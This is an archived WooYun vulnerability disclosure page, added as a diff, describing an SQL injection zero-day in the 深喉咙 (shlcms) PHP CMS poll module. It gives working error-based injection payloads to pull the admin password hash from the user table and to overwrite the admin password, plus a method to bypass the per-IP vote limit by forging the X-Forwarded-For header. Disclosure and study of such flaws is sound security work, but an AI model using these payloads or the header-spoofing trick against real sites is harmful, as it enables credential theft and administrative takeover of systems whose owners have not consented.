@@ -1,0 +1,323 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		深喉咙CMS(shlcms PHP)SQL注射0day  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		深喉咙CMS(shlcms PHP)SQL注射0day  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/数据流">数据流</a> 
+</li><li>提交时间：		2014-01-12 19:45</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-12：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2014-02-26：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail"> （PS：这CMS的名字令人遐想)<br />
+<br />
+http://www.shenhoulong.com/ 隶属公司http://company.loooe.com/</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">/Deepthroat/content/poll/ -&gt; index.php<br />
+<br />
+<br />
+<br />
+</p><pre><code>if ($request[&#039;vtype&#039;]==&#039;a&#039;)<br />
+  57              {    <br />
+  58                  $db-&gt;query(&quot;UPDATE &quot;.TB_PREFIX.&quot;poll SET num=num+1 WHERE id=&quot;.$request[&#039;choice&#039;]);<br />
+  59                  <br />
+  60                  $db-&gt;query(&quot;UPDATE &quot;.TB_PREFIX.&quot;poll_category SET client_ip=&#039;&quot;.$insert_ip.&quot;&#039; WHERE id=&quot;.$params[&#039;args&#039;]);<br />
+  61                  <br />
+  62                  echo &#039;&lt;script&gt;alert(&quot;æŠ•ç¥¨æˆåŠŸï¼&quot;);window.location.href=&quot;&#039;.$url.&#039;&quot;;&lt;/script&gt;&#039;;<br />
+  63              }<br />
+  64              elseif ($request[&#039;vtype&#039;]==&#039;b&#039;)<br />
+  65              {<br />
+  66                  for ($i=0;$i&lt;count($request[&#039;choice&#039;]);$i++)<br />
+  67                  {<br />
+  68                   $db-&gt;query(&quot;UPDATE &quot;.TB_PREFIX.&quot;poll SET num=num+1 WHERE id=&quot;.$request[&#039;choice&#039;][$i]);<br />
+  69                  }<br />
+  70                  $db-&gt;query(&quot;UPDATE &quot;.TB_PREFIX.&quot;poll_category SET client_ip=&#039;&quot;.$insert_ip.&quot;&#039; WHERE id=&quot;.$params[&#039;args&#039;]);<br />
+  71                  <br />
+  72                  echo &#039;&lt;script&gt;alert(&quot;投票成功&quot;);window.location.href=&quot;&#039;.$url.&#039;&quot;;&lt;/script&gt;&#039;;<br />
+  73              }<br />
+  74          }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+投票处选项ID 参数choice没有做过滤就带入数据库查询导致注入漏洞的产生<br />
+<br />
+</p><p class="detail"><a href="../images/121911077f37792254ddcd790421852593a9e431.jpg" target="_blank"><img src="../images/121911077f37792254ddcd790421852593a9e431.jpg" alt="QQ截图20140112190842.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+UPDATE注射 唯有用显错注射<br />
+<br />
+投票时抓包 choice参数改成SQL语句<br />
+<br />
+<br />
+<br />
+POC:</p><pre><code>and (select 1 from  (select count(*),concat((select ((select pwd from shl_user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/1219133514c9394f5b7cbba5cac6e15446a54cbf.jpg" target="_blank"><img src="../images/1219133514c9394f5b7cbba5cac6e15446a54cbf.jpg" alt="QQ截图20140112191109.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+密码很变态<br />
+<br />
+<br />
+<br />
+加密函数：/Deepthroat/inc/ -&gt; class.shlencryption.php <br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;?php <br />
+   2  class shlEncryption<br />
+   3  {<br />
+   4      var $enstr = null;<br />
+   5  	function shlEncryption($str)<br />
+   6      {<br />
+   7          $this-&gt;enstr = $str;<br />
+   8      }<br />
+   9  	function get_shal()<br />
+  10      {<br />
+  11          return sha1($this-&gt;enstr);<br />
+  12      }<br />
+  13  	function get_md5()<br />
+  14      {<br />
+  15          return md5($this-&gt;enstr);<br />
+  16      }<br />
+  17  	function get_jxqy3()<br />
+  18      {<br />
+  19          $tmpMS = $this-&gt;get_shal().$this-&gt;get_md5();<br />
+  20          $tmpNewStr = substr($tmpMS,0,9).&#039;s&#039;.substr($tmpMS,10,9).&#039;h&#039;.substr($tmpMS,20,9).&#039;l&#039;.substr($tmpMS,30,9).&#039;s&#039;.substr($tmpMS,40,9).&#039;u&#039;.substr($tmpMS,50,9).&#039;n&#039;.substr<br />
+  21  ($tmpMS,60,9).&#039;y&#039;.substr($tmpMS,70,2);<br />
+  22          $tmpNewStr = substr($tmpNewStr,-36).substr($tmpNewStr,0,36);<br />
+  23          $tmpNewStr = substr($tmpNewStr,0,70);<br />
+  24          $tmpNewStr = substr($tmpNewStr,0,14).&#039;j&#039;.substr($tmpNewStr,14,14).&#039;x&#039;.substr($tmpNewStr,28,14).&#039;q&#039;.substr($tmpNewStr,32,14).&#039;y&#039;.substr($tmpNewStr,56,14).&#039;3&#039;;<br />
+  25          return $tmpNewStr;<br />
+  26      }<br />
+  27  	function to_string()<br />
+  28      {<br />
+  29          $tmpstr = $this-&gt;get_jxqy3();<br />
+  30          $tmpstr = substr($tmpstr,-35).substr($tmpstr,0,40);<br />
+  31          return $tmpstr;<br />
+  32      }<br />
+  33  }<br />
+  34  ?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+SHA1加密的值加上MD5加密的值 然后各种substr HASH基本不能逆了<br />
+<br />
+<br />
+<br />
+运气好的可以去UPDATE一下密码<br />
+<br />
+把密码update成admin：<br />
+<br />
+</p><pre><code>and (select 1 from  (select count(*),concat((select ((update pwd = &#039;33e2q1yc3d033e22aesyc2140aec3l850c3a99s21232f297uj&#039; where username=&#039;admin&#039;)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+虽然密码解密不了 但还可以基于SQL注射进行下一步渗透<br />
+<br />
+可投票时候做了限制 只允许一个IP投票一次 也就代表一个IP只能执行一次SQL注射语句<br />
+<br />
+这对于进一步的渗透是很麻烦<br />
+<br />
+<br />
+<br />
+/Deepthroat/content/poll/ -&gt; index.php<br />
+<br />
+</p><pre><code>if(!empty($request[&#039;vtype&#039;])&amp;&amp;!empty($request[&#039;choice&#039;]))<br />
+  33          {<br />
+  34              $sql=&quot;SELECT * FROM &quot;.TB_PREFIX.&quot;poll_category WHERE id=&quot;.$params[&#039;args&#039;];<br />
+  35              $poll_client=$db-&gt;get_row($sql);<br />
+  36              $cur_ip=getip();<br />
+  37              if(empty($poll_client-&gt;client_ip))<br />
+  38              {<br />
+  39                  $insert_ip=$cur_ip;<br />
+  40              }<br />
+  41              else<br />
+  42              {<br />
+  43                  $checkIP=split(&#039;;&#039;,$poll_client-&gt;client_ip);<br />
+  44                  if(in_array($cur_ip,$checkIP))<br />
+  45                  {<br />
+  46                      echo &quot;&lt;script language=&#039;javascript&#039;&gt;alert(&#039;您已经投过票了!&#039;);window.history.go(-1);&lt;/script&gt;&quot;;<br />
+  47                      exit;<br />
+  48                  }<br />
+  49                  array_push($checkIP,$cur_ip);<br />
+  50                  $insert_ip=implode(&#039;;&#039;,$checkIP);<br />
+  51              }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+看看getip()函数<br />
+<br />
+<br />
+<br />
+/Deepthroat/inc/function.php -&gt; line 347<br />
+<br />
+<br />
+<br />
+</p><pre><code>function getip()<br />
+ 348  {<br />
+ 349      if(getenv(&#039;HTTP_CLIENT_IP&#039;))<br />
+ 350      {<br />
+ 351          $client_ip = getenv(&#039;HTTP_CLIENT_IP&#039;);<br />
+ 352      }<br />
+ 353      elseif(getenv(&#039;HTTP_X_FORWARDED_FOR&#039;))<br />
+ 354      {<br />
+ 355          $client_ip = getenv(&#039;HTTP_X_FORWARDED_FOR&#039;);<br />
+ 356      }<br />
+ 357      elseif(getenv(&#039;REMOTE_ADDR&#039;))<br />
+ 358      {<br />
+ 359          $client_ip = getenv(&#039;REMOTE_ADDR&#039;);<br />
+ 360      }<br />
+ 361      else<br />
+ 362      {<br />
+ 363          $client_ip = $HTTP_SERVER_VAR[&#039;REMOTE_ADDR&#039;];<br />
+ 364      }<br />
+ 365      return ip2long($client_ip);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+那么利用X-FORWARDED-FOR可以伪造 从而突破限制<br />
+<br />
+X-FORWARDED-FOR: 8.8.8.8<br />
+<br />
+</p><p class="detail"><a href="../images/1219245209943a247e33b03d8312f3925a5ae81c.jpg" target="_blank"><img src="../images/1219245209943a247e33b03d8312f3925a5ae81c.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/12192900a30b62233e8607bf95a2cebf93ed6dbe.jpg" target="_blank"><img src="../images/12192900a30b62233e8607bf95a2cebf93ed6dbe.jpg" alt="zz.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/数据流" title="数据流">数据流</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-048686" title="深喉咙CMS(shlcms PHP)SQL注射0day">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="48686";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
